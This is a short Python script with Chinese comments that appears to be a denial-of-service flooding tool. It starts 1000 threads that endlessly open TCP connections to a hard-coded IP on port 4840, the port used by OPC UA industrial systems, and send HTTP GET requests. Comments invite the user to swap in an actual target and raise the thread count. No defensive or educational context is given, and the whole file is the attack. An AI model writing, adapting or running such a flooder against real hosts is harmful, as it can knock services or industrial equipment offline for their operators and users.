import socket
import threading

# 目标IP和端口
target_ip = '10.4.3.195'  # 替换为实际的目标IP
target_port = 4840  # 替换为实际的目标端口

def dos_attack(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # 设置超时时间为5秒
            s.connect((ip, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (ip, port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (ip, port))
            s.close()
            print(f"Successfully sent request to {ip}:{port}")
        except ConnectionRefusedError:
            print(f"Connection to {ip}:{port} refused")
        except Exception as e:
            print(f"An error occurred: {e}")

# 创建多个线程进行攻击
threads = []
num_threads = 1000  # 你可以调整线程的数量
for i in range(num_threads):
    thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
    threads.append(thread)
    thread.start()

# 等待所有线程完成
for thread in threads:
    thread.join()
